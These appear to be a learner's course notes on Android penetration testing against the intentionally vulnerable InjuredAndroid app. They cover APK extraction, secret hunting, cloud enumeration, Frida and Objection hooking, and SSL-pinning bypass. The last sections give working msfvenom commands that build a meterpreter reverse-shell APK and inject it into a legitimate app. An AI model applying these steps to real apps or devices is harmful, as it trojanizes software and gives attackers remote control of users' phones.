### Installing and Retrieving APK File from Emulator/Phone
- First install the package through downloading from *Google Play Store* or downloading from internet then dragging and dropping into emulator/phone
- Ensure the phone is activated and connected to *Android Studio*
- Connect via cli:
	- `adb shell`
- In shell locate the package:
	- generic_x86_64:/ $ `pm list packages | grep injured`
	- Output:
		- `package:b3nac.injuredandroid`
	- Use the package name to locate the source directory:
		- generic_x86_64:/ $ `pm path b3nac.injuredandroid`
		- Output:
		- `package:/data/app/b3nac.injuredandroid-J7u73mvcBm17VsHlO9451g==/base.apk`
- Once the source directory on the phone has been discovered:
	- Create a folder on host machine:
		- `mkdir APKFolder; cd APKFolder`
	- Pull the package directly from the phone via `adb` command:
		- `adb pull /data/app/b3nac.injuredandroid-J7u73mvcBm17VsHlO9451g==/base.apk injuredAndroid_pulled.apk`
- Now the *APK* file can be further enumerated via:
	`jadx-gui`

### Decompile *APK* with `apktool`
- `apktool d -r injuredAndroid_pulled.apk`

## Android Static Analysis
### Find Hard-coded Strings
- Go To
	- jadx-gui
		- Resources
			- res
				- AndroidManifest.xml
					- Search for:
						- exported="true"
						- Refer too:
							- [[Exported=`true`]]
				- resources.arsc
					- res
						- values
							- Here you will find numerous *.xml* files that will hold potential **secrets**
							- Some common search words in **strings.xml** include:
								- api
								- id
								- password
								- aws
								- http://
								- https://
								- firebase
		- Click on the **wand** - top left toolbar
			- Search across all files in source code:
				- api
				- password
				- http://
				- https://
				- username
				- firebase.io
				- SQL
				- key
				- ClientId
				- ClientSecret
				- Base64.decode

### Search for firebase databases
- `git clone https://github.com/Sambal0x/firebaseEnum; cd firebaseEnum`
	- `pip3 install -r requirements.txt`
	- Command that searched for `injuredandroid` firebase databases:
		- `python3 firebaseEnum.py -k injuredandroid`
- In **strings.xml** a *firebase_database_url* may be found:
	- hxxps://injuredandroid.firebaseio.com
		- This can lead to information disclosure
		- In flag 9 source code a **Base64.decode** string can be found:
			- `flags/`
			- Go to:
				-  hxxps://injuredandroid.firebaseio.com/flags/.json
					- Appending **.json** is a trick to insight information disclosure

### Use **cloud_enum**
- `git clone https://github.com/initstring/cloud_enum; cd cloud_enum`
	- `pip3 install -r requirements.txt`
- If the AWS credentials were hard-coded like they are in the MAPT:
	- `sudo apt install awscli`
	- `aws configure --profile injuredandroid`
		- Enter the *Access Key ID*
		- Enter the *Secret Access Key*
	- `aws s3 ls s3://injuredandroid --profile injuredandroid`

### Use **MobSF**
- `git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF; cd Mobile-Security-Framework-MobSF`
	- `pip3 install -r requirements`
	- `./setup.sh`
- `./run.sh`
- Go to `localhost:8000`

## Android Dynamic Analysis
## Burpsuite Certificate Setup For Android
- Go to burpsuite
	- Proxy -> Options -> Proxy Listeners
		- `Add`:
			- `All interfaces`
			- `port 8082`
		- `Import / export CA cerficate`
			- Export:
				- `Certificate in DER format`
				- File Name:
					- `Burp_TCMAcademy.CER`
				- Copy this folder directly into emulator by dragging and dropping
				- Go into phone `settings`:
					- `Security`
						- `Install from SD card`
							- `Internal storage`
								- `Download`
								- Click the Certificate
								- Enter certificate name:
									- `Burp_TCM`
								- Setup Pin:
									- `1234`

### Additional Tools for Mobile Hacking
- Frida
	- `pip3 install frida-tools` or `pip3 install --upgrade frida-tools`
		- Ensure *path* is properly set for tools:
			- `echo 'export PATH=/home/windows_kali/.local/bin:$PATH' >> ~/.zshrc`
- Objection
	- `pip3 install objection` or `pip3 install --upgrade objection`
	- To utilize *objection* with an *APK* file the proper process to retrieve said *APK* file was used
	- Refer too:
		- [[Installing and Retrieving APK File from Emulator-Phone]]
	- Once *APK* file is pulled:
	- `cd` to the proper directory then execute:
		- `objection patchapk --source injuredAndroid_pulled.apk`
	- Drag and drop `injuredAndroid_pulled.objection.apk` into the emulator
	- Run the application
	- In terminal:
		- `objection explore`

### Injecting *Frida* manually
- References
	- Guide:
		- [[https://koz.io/using-frida-on-android-without-root/]]
	- Gadget documentation:
		- [[https://frida.re/docs/gadget/]]
	- Download latest release:
		- [[https://github.com/frida/frida/releases]]
- If not done so already:
- Decompile *APK* with `apktool`
	- `apktool d -r injuredAndroid_pulled.apk`
- `cd` to the decompiled directory:
	- Go to `lib` directory
	- Go to the emulator/phone CPU architecture folder:
		- `x86_64`
	- Visit:
		- [[https://github.com/frida/frida/releases]]
		- Copy the link for the relevant device architecture:
			- `wget https://github.com/frida/frida/releases/download/15.1.1/frida-gadget-15.1.1-android-x86_64.so.xz`
			- Unzip package and rename:
				- `libfrida-gadget.so`
			- Move this file into the decompiled `x86_64` directory
				- `mv ~/desktop/libfrida-gadget.so  ~/desktop/InjuredAndroid-1.0.12-release/lib/x86_64`
			- Copy:
				- `const-string v0, "frida-gadget"`
				- `invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V`
			- Navigate to:
				- `~/desktop/InjuredAndroid-1.0.12-release/smali/b3nac/injuredandroid`
				- Find:
					- `MainActivity.smali`
				- Change:

```smali
# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroidx/appcompat/app/c;-><init>()V

    return-void
```

- To

```smali
# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroidx/appcompat/app/c;-><init>()V

    const-string v0, "frida-gadget"
invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V

    return-void
```

- Recompile with `apktool`
	- `apktool b injuredAndroid_pulled -o injured_patched.apk `
	- If errors occur:
		- `git clone https://github.com/graylagx2/apktoolfix`
			- Adjust `apktool` version number in code
			- `sudo ./apktoolfix_2.1.2.sh`
			- Then build the package again and it should work properly
- Sign the *APK*
	- `keytool -genkey -v -keystore demo.keystore -alias demokeys -keyalg RSA -keysize 2048 -validity 10000`
	- `jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore demo.keystore -storepass password123 injured_patched.apk demokeys`
- Check the authenticity
	- `jarsigner -verify injured_patched.apk`
- Finalize:
	- `zipalign 4 injured_patched.apk injured_patchedfinal.apk`
- Drag and drop `injured_patchedfinal.apk` into the emulator
- Run the application
- In terminal:
	- `objection explore`

### Objection relevant commands
- `android clipboard monitor`
- `android heap`
- `android keystore list`
- `android keystore watch`
- `android root simulate`
- `android sslpinning disable`
- `android root disable`

### Use Frida CodeShare and Enable Scripts on Startup With Objection
- References:
	- [[https://codeshare.frida.re/]]
	- [[https://academy.tcm-sec.com/courses/1557555/lectures/38201184]]
- Syntax:
	- `objection explore --startup-script sslpinninguniversal.js`
- Start App then run the above right after
- Alternatively:
	- `objection explore -s "android root disable"`

### MOBSF Relevant
- Start emulator:
	- `nexus -writable-system -no-snapshot`
- Start MOBSF:
	- Travel to directory
		- `./run.sh`
	- Go to `127.0.0.1:8000`

### Create a Generic APK with Metasploit Shell

- `msfvenom -p android/meterpreter/reverse_tcp LHOST=172.25.7.124 LPORT=8088 R > android_shell.apk`
- `keytool -genkey -v -keystore demo.keystore -alias demokeys -keyalg RSA -keysize 2048 -validity 10000`
- `jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore demo.keystore -storepass password123 android_shell.apk demokeys`
- `zipalign 4 android_shell.apk android.apk`
- Run:
	- `msfconsole`
		- `use exploit/multi/handler`
		- `set PAYLOAD android/meterpreter/reverse_tcp`
		- `set lhost 172.25.7.124`
		- `set lport 8088`
		- `exploit`
- In terminal:
	- `start_emulator; nexus`
- Drag and drop `android.apk` into emulator
- Open the application in emulator and accept permissions

### Injecting Play Store App with Metasploit Shell
- Refer too:
	- [[Installing and Retrieving APK File from Emulator-Phone]]
- Ensure the pulled *apk* is in the current working directory
	- `msfvenom -x injuredAndroid_pulled.apk -p android/meterpreter/reverse_tcp LHOST=172.25.7.124 LPORT=8088 R > android_shell.apk`
- Install onto emulator
	- `adb install android_shell.apk`
- Run:
	- `msfconsole`
		- `use exploit/multi/handler`
		- `set PAYLOAD android/meterpreter/reverse_tcp`
		- `set lhost 172.25.7.124`
		- `set lport 8088`
		- `exploit`
- In terminal:
	- `start_emulator; nexus`
- Drag and drop `android.apk` into emulator
- Open the application in emulator and accept permissions
- Meterpreter android commands:
	- [[https://gist.github.com/mataprasad/c5dd39154a852cdc67ff7958e0a82699]]

### Reading Material
- [[https://www.blackhillsinfosec.com/embedding-meterpreter-in-android-apk/]]

#hacking
